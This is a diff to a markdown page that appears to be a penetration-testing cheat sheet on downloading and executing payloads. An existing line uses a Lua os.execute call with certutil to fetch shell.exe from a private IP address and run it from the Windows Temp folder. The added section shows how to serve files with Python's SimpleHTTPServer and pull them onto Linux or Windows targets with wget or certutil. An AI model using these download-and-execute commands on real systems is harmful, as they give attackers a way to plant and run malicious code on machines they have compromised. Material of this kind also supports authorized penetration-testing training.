@@ -21,5 +21,17 @@ Download & Execute Python Command
 os.execute('cmd.exe /c certutil.exe -urlcache -split -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe & C:\Windows\Temp\shell.exe')
 ```
 
+# Alternative Transferring files
+```
+# Important: Create HTTP server serving files in current directory on port 8000
+python -m SimpleHTTPServer 8000
+
+# Download files from above server on linux
+wget 10.0.0.X/filename.sh
+
+# Download files from above server on Windows
+certutil -urlcache -f http://10.0.0.X:8000/filename.sh
+```
+
 ## Back to README.md
 [BACK](/README.md)
